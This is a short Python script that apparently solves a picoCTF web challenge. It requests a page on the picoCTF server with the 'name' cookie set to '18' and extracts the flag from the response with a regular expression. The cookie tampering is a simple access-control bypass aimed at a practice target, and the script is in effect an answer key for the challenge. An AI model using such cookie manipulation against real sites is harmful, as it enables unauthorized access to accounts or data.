import requests
import re

r = requests.get('http://mercury.picoctf.net:29649/check', cookies={"name": "18"})

text = r.text

m = re.search('picoCTF{.*}', text)
if m:
    print(m.group(0))
